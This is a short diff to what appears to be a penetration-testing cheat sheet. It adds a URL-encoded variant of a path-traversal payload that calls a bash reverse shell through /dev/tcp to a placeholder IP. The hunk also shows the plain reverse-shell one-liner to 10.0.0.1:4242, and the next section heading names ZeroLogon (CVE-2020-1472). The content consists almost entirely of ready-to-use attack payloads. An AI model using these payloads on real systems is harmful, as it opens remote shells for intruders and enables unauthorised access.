@@ -6,6 +6,7 @@ BASH TCP SHELL
 ```
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ../../../../../var/crash/test.php&cmd=/bin/bash -c ‘bash -i > /dev/tcp/IP/80 >&1’
+../../../../../var/crash/test.php&cmd=/bin/bash%20-c%20%E2%80%98bash%20-i%20%3E%20/dev/tcp/IP/80%20%3E&1%E2%80%99%0A%0A%0A
 ```
 
 ZeroLogon - CVE-2020-1472
